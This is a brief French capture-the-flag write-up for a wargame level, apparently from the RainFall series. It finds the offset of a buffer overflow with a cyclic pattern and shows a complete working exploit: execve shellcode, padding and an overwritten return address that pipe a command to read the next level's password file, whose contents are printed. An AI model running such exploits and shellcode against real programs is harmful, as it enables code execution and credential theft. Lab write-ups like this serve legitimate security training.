1. On remarque le buffer overflow sur le deuxieme fgets. Pour exploiter la faille on passe le nom d'utilisateur attendu en debut de chaine, on remplis le buffer et enfin notre payload.

2. On trouve l'offset
   ```
   r < <(python -c 'print "dat_wil" + "\x90" * (256 - 7) + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')

   Program received signal SIGSEGV, Segmentation fault.
   0x63413663 in ?? ()
   ```
   > 79

3. On choisi un shellcode
   ```
   \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
   ```

4. On ecrit l'exploit


```
(python -c '''

user = "dat_wil"
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
padding = "X" * (256 - len(user + shellcode) + 79)

print user + shellcode + padding + "\x08\x04\xa0\x47"[::-1]

'''; echo "cat /home/users/level02/.pass" ) | ./level01
```

> PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
